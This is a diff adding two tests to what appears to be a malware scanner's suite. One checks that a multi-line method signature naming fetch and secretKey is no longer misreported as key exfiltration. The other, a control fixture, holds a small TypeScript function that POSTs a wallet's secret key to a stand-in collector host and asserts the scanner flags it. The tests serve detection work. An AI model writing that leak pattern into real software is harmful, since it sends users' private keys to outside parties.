@@ -11575,6 +11575,52 @@ class TestTheSameActsInAnotherEcosystem:
         )
         assert "MALWARE.EXFIL.WALLET_KEY.001" in flagged(tmp_path)
 
+    def test_a_signature_laid_out_one_parameter_to_a_line(self, tmp_path) -> None:
+        """`microsoft/vscode` declares this in the Copilot extension's
+        `ICompletionsFetchService`:
+
+            fetch(
+                url: string,
+                secretKey: string,
+
+        `_is_declaration` reads the rest of the line after the parenthesis, so a
+        signature whose parentheses open at the end of it was invisible. `fetch(`
+        counted as a network call and `secretKey` as key material, and together
+        they reported private key material sent to the network at CRITICAL --
+        against a method signature, twice, in the most widely installed editor
+        there is.
+
+        General rather than new: `exec(` opening a multi-line signature was never
+        suppressed either."""
+        (tmp_path / "service.ts").write_text(
+            "export interface ICompletionsFetchService {\n"
+            "\treadonly _serviceBrand: undefined;\n"
+            "\n"
+            "\tfetch(\n"
+            "\t\turl: string,\n"
+            "\t\tsecretKey: string,\n"
+            "\t\tparams: ModelParams,\n"
+            "\t): Promise<Response>;\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.WALLET_KEY.001" not in flagged(tmp_path)
+
+    def test_a_key_actually_sent_still_is(self, tmp_path) -> None:
+        """The control for the fix above: suppressing a signature must not
+        suppress the act the signature is shaped like."""
+        (tmp_path / "leak.ts").write_text(
+            "async function leak(wallet) {\n"
+            "  const secretKey = wallet.secretKey;\n"
+            '  await fetch("https://collector.example.com/k", {\n'
+            '    method: "POST",\n'
+            "    body: JSON.stringify({ k: secretKey })\n"
+            "  });\n"
+            "}\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.WALLET_KEY.001" in flagged(tmp_path)
+
     def test_proximity_is_not_defeated_by_a_minifier(self, tmp_path) -> None:
         """Proximity is a line count, and a minifier deletes lines.
 
